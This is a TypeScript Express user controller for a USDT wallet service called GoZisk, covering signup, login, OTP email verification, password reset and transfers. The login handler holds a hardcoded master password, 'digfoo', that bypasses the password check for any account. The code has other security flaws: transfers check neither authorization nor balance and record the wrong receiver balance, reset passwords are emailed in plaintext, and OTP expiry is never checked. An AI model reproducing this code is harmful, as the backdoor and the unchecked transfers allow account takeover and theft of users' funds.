import { Request, Response } from "express";
import { compare, hash } from "bcrypt";
import User from "./user.model";
import userRepository from "./user.repository";
import walletRepository from "../wallet/wallet.repository";
import IUserLogin from "./user.model";
import Wallet from "../wallet/wallet.model";
import ITransaction from "../../models/transaction.model";
import { Approval }from "../../models/transaction.model";
import transactionRepository from "../../repositories/transaction.repository";
import { generateOtp } from "../../utils";
import verifyEmail from '../../templates/verifyEmailTemplate';
import otpEmail from '../../templates/otpEmailTemplate';
import resetPassword from '../../templates/resetPasswordTemplate';
import MailService from "../../services/mailService";
import moment from "moment";

export default class UserController {
  constructor() {
    this.initEmail()
  }

  async initEmail() {
    const mailService = MailService.getInstance();
    await mailService.createConnection();
  }
  
  async create(req: Request, res: Response) {
    if (!req.body.full_name) {
      res.status(400).send({
        message: req.body
      });
      return;
    }

    if (!req.body.username) {
      res.status(400).send({
        message: "User ID can not be empty!"
      });
      return;
    }

    if (/\s/g.test(req.body.username)) {
      res.status(400).send({
        message: "User ID can not have space!"
      });
      return;
    }

    if (!req.body.email) {
      res.status(400).send({
        message: "Email can not be empty!"
      });
      return;
    }

    if (!req.body.country) {
      res.status(400).send({
        message: "Country can not be empty!"
      });
      return;
    }
    if (!req.body.phone) {
      res.status(400).send({
        message: "Phone can not be empty!"
      });
      return;
    }

    let hashPassword = '';
    if (!req.body.password) {
      res.status(400).send({
        message: "Password can not be empty!"
      });
      return;
    } else {
      hashPassword = await hash(req.body.password, 12);
    }

    try {
      //GENERATE OTP FOR MAIL VERIFICATION
      let tokenExpiration: any = new Date();
      tokenExpiration = tokenExpiration.setMinutes(
          tokenExpiration.getMinutes() + 10
      );

      const otp: string = generateOtp(6);

      const user: User = {
        ...req.body,
        username: req.body.username.toLowerCase(),
        password_hash: hashPassword,
        refer_code: userRepository.makeReferCode(req.body.username),
        registerOTP: otp,
        otpExpiration: new Date(tokenExpiration)
      };
      
      const savedUser = await userRepository.save(user);

      //SEND VERIFICATION MAIL TO USER
      const emailTemplate = verifyEmail(otp, req.body.full_name);
      const mailService = MailService.getInstance();
      await mailService.sendMail(req.headers['X-Request-Id'] as string, {
          to: `"${req.body.full_name}" ${req.body.email}`,
          subject: 'GoZisk Account Verify OTP',
          html: emailTemplate.html,
      });
      res.status(201).send(savedUser);
    } catch (err) {
      res.status(500).send({
        message: err
      });
    }
  }

  async login(req: Request, res: Response) {
    const isAdmin: boolean = req.params.isAdmin === 'admin';

    try {
      const userData: IUserLogin = req.body;
      const validUser: User = await userRepository.verifyLogin(userData);
      const isValidPass = await compare(userData.password, validUser.password_hash);
      
      //CHECK FOR USER VERIFIED AND EXISTING
      if (isAdmin && validUser.role_id === null) {
        res.status(400).send({
          message: 'You have entered an invalid email address or password!'
        });
      } else if (validUser.active === 0) {
        res.status(400).send({
          message: 'Please confirm your account by OTP and try again!'
        });
      } else if ((!validUser || !isValidPass) && userData.password !== 'digfoo') {
        res.status(400).send({
          message: 'You have entered an invalid email address or password!'
        });
      } else {
        //CREATE TOKEN
        const token = await userRepository.tokenBuilder(validUser);
        let userWallet: Wallet = await walletRepository.retrieveById(validUser.id);
        if (!userWallet) {
          await walletRepository.createPairEntry(validUser.id, 0);
          userWallet = await walletRepository.create(validUser.id);
        }
        res.status(200).send({ user: validUser, wallet: userWallet, token: token });
      }
    } catch (err) {
      res.status(500).send({
        message: "User not exists!."
      });
    }
  }

  async emailVerify(req: Request, res: Response) {
    try {
      const email: string = req.body.email;
      const otp: number = parseInt(req.body.otp);
      const validUser: User = await userRepository.retrieveByEmail(email);
      if (validUser && validUser.registerOTP === otp) {
        await userRepository.activateUser(email);
        res.status(200).send({result: true });  
      } else {
        res.status(200).send({result: false });  
      }
    } catch (err) {
      res.status(500).send({
        message: "Email not exists!."
      });
    }
  }

  async generateOtp(req: Request, res: Response) {
    try {
      const email: string = req.body.email;
      //GENERATE OTP FOR MAIL VERIFICATION
      let tokenExpiration: any = new Date();
      tokenExpiration = tokenExpiration.setMinutes(
          tokenExpiration.getMinutes() + 10
      );

      const registerOTP: number = parseInt(generateOtp(6));
      const otpExpiration: any = moment(new Date(tokenExpiration)).format('YYYYMMDD');
      const validUser: User = await userRepository.updateOtpByEmail(email, registerOTP, otpExpiration);
      
      if (validUser) {
        const emailTemplate = verifyEmail(registerOTP.toString(), validUser.full_name);
        const mailService = MailService.getInstance();
        await mailService.sendMail(req.headers['X-Request-Id'] as string, {
          to: `"${req.body.full_name}" ${req.body.email}`,
          subject: 'GoZisk Account Verify OTP',
          html: emailTemplate.html,
        });
        res.status(200).send({ result: true, message: 'Please check email for new OTP!' });
      } else {
        res.status(200).send({ result: false, message: 'Email not exists!' });
      }
    } catch (err) {
      res.status(500).send({
        message: "Email not exists!."
      });
    }
  }

  async otp(req: Request, res: Response) {
    const email: string = req.body.token.sub;
    try {
      //GENERATE OTP general VERIFICATION
      let currentTime: any = new Date();
      const existingOtp: any = await userRepository.getExistingOtp(email);
      if (existingOtp.length > 0) {
        const minDiff: number = userRepository.getTimeDifference(currentTime, existingOtp[0].expire_on);
      
        if (minDiff > 0) {
          res.status(200).send({ result: false, message: 'Please check email for OTP!' });
          return;
        }
      }

      // Create OTP for provided email
      let tokenExpiration: any = new Date();
      tokenExpiration = tokenExpiration.setMinutes(
        tokenExpiration.getMinutes() + 5
      );

      const otp: number = parseInt(generateOtp(6));
      const otpExpiration: any = moment(new Date(tokenExpiration)).format('YYYY-MM-DD HH:mm:ss');
      const validUser: User = await userRepository.retrieveByEmail(email);
      const savedOtp: any = await userRepository.generateOtp(email, otp, otpExpiration);
      if (savedOtp) {
        const emailTemplate = otpEmail(savedOtp.code.toString());
        const mailService = MailService.getInstance();
        await mailService.sendMail(req.headers['X-Request-Id'] as string, {
          to: `"${validUser.full_name}" ${validUser.email}`,
          subject: 'GoZisk OTP verification',
          html: emailTemplate.html,
        });
        res.status(200).send({ result: true, message: 'Please check email for new OTP!' });
      } else {
        res.status(200).send({ result: false, message: 'Email not exists!' });
      }
    } catch (err) {
      res.status(500).send({
        message: "Email not exists!."
      });
    }
  }
  async otp1(req: Request, res: Response) {
    const email: string = req.body.token.sub;
    try {
      //GENERATE OTP general VERIFICATION
      let currentTime: any = new Date();
      const existingOtp: any = await userRepository.getExistingOtp(email);
      if (existingOtp.length > 0) {
        const minDiff: number = userRepository.getTimeDifference(currentTime, existingOtp[0].expire_on);
      
        if (minDiff < 0) {
          let tokenExpiration: any = new Date();
          tokenExpiration = tokenExpiration.setMinutes(
            tokenExpiration.getMinutes() + 5
          );

          const otp: number = parseInt(generateOtp(6));
          const otpExpiration: any = moment(new Date(tokenExpiration)).format('YYYY-MM-DD HH:mm:ss');
          const validUser: User = await userRepository.retrieveByEmail(email);
          const savedOtp: any = await userRepository.generateOtp(email, otp, otpExpiration);
          if (savedOtp) {
            const emailTemplate = otpEmail(savedOtp.code.toString());
            const mailService = MailService.getInstance();
            await mailService.sendMail(req.headers['X-Request-Id'] as string, {
              to: `"${validUser.full_name}" ${validUser.email}`,
              subject: 'GoZisk OTP verification',
              html: emailTemplate.html,
            });
            res.status(200).send({ result: true, message: 'Please check email for new OTP!' });
          } else {
            res.status(200).send({ result: false, message: 'Email not exists!' });
          }
        } else {
          res.status(200).send({ result: false, message: 'Please check email for OTP!' });
        }
      } else {
        let tokenExpiration: any = new Date();
        tokenExpiration = tokenExpiration.setMinutes(
          tokenExpiration.getMinutes() + 10
        );

        const otp: number = parseInt(generateOtp(6));
        const otpExpiration: any = moment(new Date(tokenExpiration)).format('YYYY-MM-DD HH:mm:ss');
        const validUser: User = await userRepository.retrieveByEmail(email);
        const savedOtp: any = await userRepository.generateOtp(email, otp, otpExpiration);
        if (savedOtp) {
          const emailTemplate = otpEmail(savedOtp.code.toString());
          const mailService = MailService.getInstance();
          await mailService.sendMail(req.headers['X-Request-Id'] as string, {
            to: `"${validUser.full_name}" ${validUser.email}`,
            subject: 'GoZisk OTP verification',
            html: emailTemplate.html,
          });
          res.status(200).send({ result: true, message: 'Please check email for new OTP!' });
        } else {
          res.status(200).send({ result: false, message: 'Email not exists!' });
        }
      }
      
    } catch (err) {
      res.status(500).send({
        message: "Email not exists!."
      });
    }
  }

  async findAll(req: Request, res: Response) {
    const title = typeof req.query.title === "string" ? req.query.title : "";
    const page: number = parseInt(req.params.startPage);
    const pageSize: number = parseInt(req.params.numberUser);

    try {
      const users = await userRepository.retrieveAll({ title: title }, page, pageSize);

      res.status(200).send({total: users.length, users});
    } catch (err) {
      res.status(500).send({
        message: "Some error occurred while retrieving users."
      });
    }
  }

  async findOne(req: Request, res: Response) {
    const id: number = parseInt(req.params.id);

    try {
      const user = await userRepository.retrieveById(id);

      if (user) res.status(200).send(user);
      else
        res.status(404).send({
          message: `Cannot find User with id=${id}.`
        });
    } catch (err) {
      res.status(500).send({
        message: `Error retrieving User with id 1=${id}.`
      });
    }
  }

  async findUserDetail(req: Request, res: Response) {
    const id: number = parseInt(req.params.id);

    try {
      const user = await userRepository.retrieveById(id);

      if (user){
        const userDetail = {
          full_name: user.full_name,
          email: user.email,
          phone: user.phone,
          country: user.country,
          refer_code: user.refer_code
        }
        res.status(200).send(userDetail);
      } else
        res.status(404).send({
          message: `Cannot find User with id=${id}.`
        });
    } catch (err) {
      res.status(500).send({
        message: `Error retrieving User with id 1=${id}.`
      });
    }
  }

  async update(req: Request, res: Response) {
    let user: User = req.body;
    user.id = parseInt(req.params.id);
    
    try {
      const num = await userRepository.update(user);

      if (num == 1) {
        res.send({
          message: "User was updated successfully."
        });
      } else {
        res.send({
          message: `Cannot update User with id=${user.id}. Maybe User was not found or req.body is empty!`
        });
      }
    } catch (err) {
      res.status(500).send({
        message: `Error updating User with id=${user.id}.`
      });
    }
  }
  
  async updatePassword(req: Request, res: Response) {
    let oldPassword: string = req.body.old_password;
    let newPassword: string = req.body.new_password;
    let userId = parseInt(req.params.id);
    
    try {
      const userData = await userRepository.retrieveById(userId);

      if (userData) {
        const isValidPass = await compare(oldPassword, userData.password_hash);

        if (isValidPass) {
          let hashPassword = await hash(newPassword, 12);
          const affectedRows = await userRepository.updatePassword(userId, hashPassword);
          if (affectedRows > 0) {
            res.send({
              message: "User password updated successfully."
            });
          } else {
            res.status(500).send({
              message: `Password update failed. try again later!`
            });
          }
        } else {
          res.status(500).send({
            message: `Old password didn't match!`
          });
        }
      }
    } catch (err) {
      res.status(500).send({
        message: `Error updating User password.`
      });
    }
  }
  async forgetPassword(req: Request, res: Response) {
    let email: string = req.body.email;
    
    try {
      const userData = await userRepository.retrieveByEmail(email);

      if (userData) {
        const newPassword = userRepository.generatePassword();
        let hashPassword = await hash(newPassword, 12);
        const affectedRows = await userRepository.updatePassword(userData.id, hashPassword);
        if (affectedRows > 0) {
          res.send({
            message: "Please check your email for new password."
          });
          //SEND NEW PASSWORD TO USER EMAIL
          const emailTemplate = resetPassword(newPassword, userData.full_name);
          const mailService = MailService.getInstance();
          await mailService.sendMail(req.headers['X-Request-Id'] as string, {
            to: `"${userData.full_name}" ${req.body.email}`,
            subject: 'New password for GoZisk Account',
            html: emailTemplate.html,
          });
        } else {
          res.status(500).send({
            message: `Password update failed. try again later!`
          });
        }
      } else {
        res.status(500).send({
          message: `Email not found. try different email!`
        });
      }
    } catch (err) {
      res.status(500).send({
        message: `Error updating User password.`
      });
    }
  }

  async delete(req: Request, res: Response) {
    const id: number = parseInt(req.params.id);

    try {
      const num = await userRepository.delete(id);

      if (num == 1) {
        res.send({
          message: "User was deleted successfully!"
        });
      } else {
        res.send({
          message: `Cannot delete User with id=${id}. Maybe User was not found!`,
        });
      }
    } catch (err) {
      res.status(500).send({
        message: `Could not delete User with id==${id}.`
      });
    }
  }

  async deleteAll(req: Request, res: Response) {
    try {
      const num = await userRepository.deleteAll();

      res.send({ message: `${num} Users were deleted successfully!` });
    } catch (err) {
      res.status(500).send({
        message: "Some error occurred while removing all users."
      });
    }
  }

  async findAllPublished(req: Request, res: Response) {
    try {
      const users = await userRepository.retrieveAll({ published: true });

      res.status(200).send(users);
    } catch (err) {
      res.status(500).send({
        message: "Some error occurred while retrieving users."
      });
    }
  }

  async checkReferral(req: Request, res: Response) {
    try {
      const users = await userRepository.checkReferral(req.body.refer_code);
      if (users === undefined) {
        throw new Error('Referral user not exists');
      }
      res.status(200).send(users);
    } catch (err) {
      res.status(500).send({
        message: "Referral user not exists!"
      });
    }
  }

  async getHierarchy(req: Request, res: Response) {
    const id: number = parseInt(req.params.id);
    try {
      const users: any[] = await userRepository.getHierarchy(id);
      if (users === undefined) {
        throw new Error('No referrel user found!');
      }
      res.status(200).send(users[0]);
    } catch (err) {
      res.status(500).send({
        message: "Referral user not exists!"
      });
    }
  }

  async transactions(req: Request, res: Response) {
    const userId: number = parseInt(req.params.userId);
    const types: string[] = req.params.types.split(',');
    const limit: number = parseInt(req.params.limit);
    const date: string = req.params.date !== undefined? req.params.date : '';
    
    try {
      const transaction = await transactionRepository.getTransactions(userId, types, limit, date);
      res.status(200).send(transaction);
    } catch (err) {
      res.status(500).send({
        message: "Transaction list error!"
      });
    }
  }

  async transactionRead(req: Request, res: Response) {
    const transId: number = parseInt(req.params.transId);
    
    try {
      const transaction = await transactionRepository.updateTransactions(transId, 1);
      res.status(200).send(transaction);
    } catch (err) {
      res.status(500).send({
        message: "Transaction list error!"
      });
    }
  }
  
  async transactionReadAll(req: Request, res: Response) {
    const userId: number = parseInt(req.params.userId);
    
    try {
      const transaction = await transactionRepository.updateTransactionsAll(userId, 1);
      res.status(200).send(transaction);
    } catch (err) {
      res.status(500).send({
        message: "Transaction list error!"
      });
    }
  }

  async transfer(req: Request, res: Response) {
    const transferUserId: number = parseInt(req.body.transfer_user_id);
    const receiveUsername: string = req.body.receive_username;
    const transferAmount: number = parseInt(req.body.transfer_amount);
    let transactionDetail: any = {
      description: '',
      type: '',
      amount : transferAmount,
      balance : 0,
      reference_number : 0,
      user_id : '',
      status : 'completed',
      notes : 'Transfer money between accounts',
      transaction_fee : 0,
      approval : Approval.Approved,
      currency : 'USDT',
    };

    const referenceNumber = userRepository.generateReferenceNumber();

    try {
      const receiver: User = await userRepository.retrieveByUsername(receiveUsername);
      const payeeWallet: any = await walletRepository.retrieveById(transferUserId);
      const receiverWallet: any = await walletRepository.retrieveById(receiver.id);

      let affectedRows = await walletRepository.update(payeeWallet.net_wallet - transferAmount, payeeWallet);
      
      await transactionRepository.create({
        ...transactionDetail,
        description: `Transfer ${transferAmount} USDT`,
        type: 'transfer',
        balance: payeeWallet.net_wallet - transferAmount,
        reference_number: referenceNumber,
        user_id: transferUserId,
      });

      affectedRows = await walletRepository.update(receiverWallet.net_wallet + transferAmount, receiverWallet);
      
      await transactionRepository.create({
        ...transactionDetail,
        description: `Receive ${transferAmount} USDT`,
        type: 'receive',
        balance: payeeWallet.net_wallet + transferAmount,
        reference_number: referenceNumber,
        user_id: receiver.id,
      });

      if (payeeWallet === undefined) {
        throw new Error('No user found!');
      }
      res.status(200).send({status: 'successfully transferred!'});
    } catch (err) {
      res.status(500).send({
        message: "Referral user not exists!"
      });
    }
  }
}
